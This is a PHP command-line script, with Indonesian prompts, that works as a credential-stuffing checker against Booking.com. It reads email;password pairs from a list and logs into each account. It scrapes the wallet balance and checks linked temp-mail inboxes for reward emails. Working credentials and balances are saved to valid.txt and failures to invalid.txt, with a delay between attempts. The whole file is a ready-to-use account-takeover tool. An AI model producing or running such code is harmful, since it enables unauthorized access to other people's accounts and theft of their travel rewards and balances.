<?php
set_time_limit(0);
unlink('cookies.txt');
error_reporting(0);
yukah:
echo "[PAKE TINGGAL PAKE GAMAU YA GAUSAH]";
echo PHP_EOL;
echo "List: ";
$namafile = trim(fgets(STDIN));
echo "Delay (ex: 30): ";
$dly = trim(fgets(STDIN));
echo PHP_EOL;
$filename = dirname(__FILE__)."/$namafile";

if(file_exists($filename)) {
    $list = explode("\n",str_replace("\r","",file_get_contents($filename)));
    
    $no=1;
    foreach ($list as $value) {

        if(!is_numeric(strpos($value, ';'))) {
            echo "delim format email;password\n\n";
            die();
        }

        $account = explode(";", $value);
        $email     = $account[0];
        $password  = $account[1];
        $client_id = random(16);	
        $username = strstr($email, '@', true);
        $domain = strstr($email, '@');
        $dom = str_replace('@', '', $domain);

    //HEADER LOGIN
	$headers = array();
	$headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'X-Requested-With: XMLHttpRequest';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
    $headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
    $headers[] = 'Connection: keep-alive';
    
    //URL LOGIN & CEK WALLET
    $endpointlogin = 'https://account.booking.com/account/sign-in/password';
    $endpointcek = 'https://secure.booking.com/rewards_and_wallet/rewards.en-us.html';
    
    //POST BODY LOGIN
	        $post = '{
            "login_name": "'.$email.'",
            "password": "'.$password.'",
            "client_id": "'.$client_id.'",
            "state": "",
            "scope": "",
            "code_challenge": "",
            "code_challenge_method": "",
            "op_token": ""
            }';
        
	//LOGIN
	$login = curl($endpointlogin, $post, $headers);
	//echo $login[1];
	$urll = get_between($login[1], '"redirect_uri":"', '"');
	$reason = get_between($login[1], '"next_step":"', '"');
	$wrong = get_between($login[1], '"errors":[', ']');
	$unregistered = get_between($login[1], '"errors":[', ']');
	
	
	//GETPAIDWALLETBANNED
	$temp = tempmail($username, $dom);
	//var_dump($temp);
	$paid = get_between($temp, '<div class="e7m subj_div_45g45gg">', ',</div>');
	$paidlink = get_between($temp, '<div id="email-table"><a href="', '"');
	$url = 'https://generator.email/'.$paidlink.'';
	//echo $paid;
	$cekw = curlGetWallet($url, null, null);
	//var_dump($cekw);
	$ceksl = get_between($cekw[1], '<td align="left" style="font-size: 20px; line-height: 28px; font-weight: bold; font-family: BlinkMacSystemFont, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; color: #333333; padding: 8px 16px" valign="top" width="70%">', '<');
	//echo $ceksl;
	$ceksll = preg_replace( "/\r|\n/", "", $ceksl );
	if(strpos($temp, 'Your reward is on its way! –– Booking.com')) {
	    $land = 'Status: PAID - Reward: '.$ceksll.'';
	} else {
	    $land = 'NOT PAID - No Reward!';
	}
	
	if($reason == '/account-disabled'){
	    $reasonstatus = 'Account Disabled';
	} elseif ($wrong == 1203){
	    $reasonstatus = 'Wrong Password!';
	} elseif ($unregistered == 1204){
	    $reasonstatus = 'Unregistered!';
	} else {
	    $reasonstatus = 'Unknown Error! Unchecked!';
	}
	//echo $urll;
	
	//GET COOKIE
	$ambilcookies = curl($urll, null, $headers);
	
	//HEADER CEK WALLET
	$headerss = array();
	$headerss[] = 'Cache-Control: max-age=0';
    $headerss[] = 'Host: secure.booking.com';
    $headerss[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0';
    $headerss[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
    $headerss[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
    $headerss[] = 'Connection: keep-alive';
    $headerss[] = 'Content-Type: application/json';
    $headerss[] = 'Cookie: bkng='.$ambilcookies[2]['bkng'].'';
    $headerss[] = 'Upgrade-Insecure-Requests: 1';
    
    $cekw = curl($endpointcek, null, $headerss);
	$saldo = get_between($cekw[1], '<div class="bui-f-font-display_one"><span>', '</span>');
	
	
	//echo $saldo;
	if ($saldo == null){
	//echo color('green', "[✔]")." Email: $email - Password: $password - Wallet: $saldo\n";
	echo color('red', "[x]")." Email: $email - Password: $password - Reason: $reasonstatus - $land\n";
	
	        $file = dirname(__FILE__)."/invalid.txt";
            $fh = fopen($file, "a");
            fwrite($fh, $email.";".$password." - ".$land."\n");
            fclose($fh);
	
	sleep($dly);
    } else {
    echo color('green', "[✔]")." Email: $email - Password: $password - Wallet: $saldo\n";
    //echo color('red', "[x]")." Email: $email - Password: $password - Reason: Checking Failed!\n";
    
            $file = dirname(__FILE__)."/valid.txt";
            $fh = fopen($file, "a");
            fwrite($fh, $email.";".$password." - ".$saldo."\n");
            fclose($fh);
    
    sleep($dly);
    unlink('cookies.txt');
    }
	
    }

    echo PHP_EOL;
    echo color('green', "[✔]")." Valid Account Has Been Saved in valid.txt\n";
    echo color('red', "[x]")." Invalid Account Has Been Saved in invalid.txt\n";
    

} else {
    goto yukah;
}
	
    function random($length)
    {
        $data = 'qwertyuioplkjhgfdsazxcvbnm0123456789';
        $string = '';
        for($i = 0; $i < $length; $i++) {
            $pos = rand(0, strlen($data)-1);
            $string .= $data{$pos};
        }
        return $string;
    }
    
    function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }
    
    function color($color = "default" , $text)
    {
        $arrayColor = array(
            'grey'      => '1;30',
            'red'       => '1;31',
            'green'     => '1;32',
            'yellow'    => '1;33',
            'blue'      => '1;34',
            'purple'    => '1;35',
            'nevy'      => '1;36',
            'white'     => '1;0',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }
    
    function curl($url,$post,$headers)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		$result = curl_exec($ch);
		$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
		  parse_str($item, $cookie);
		  $cookies = array_merge($cookies, $cookie);
		}
		return array (
		$header,
		$body,
		$cookies
		);
	}
	
	function tempmail($namaa, $domain){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, "https://generator.email/inbox2/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 400); //timeout in seconds
    $headers = array();
	$headers[] = 'Cookie: surl='.$domain.'/'.$namaa.';';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch); 
    curl_close($ch);      
    return $output;
}

function curlGetWallet($url,$post,$headers)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); 
        curl_setopt($ch, CURLOPT_TIMEOUT, 400); //timeout in seconds
		curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
    	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
		if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		$result = curl_exec($ch);
		$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
		  parse_str($item, $cookie);
		  $cookies = array_merge($cookies, $cookie);
		}
		return array (
		$header,
		$body,
		$cookies
		);
	}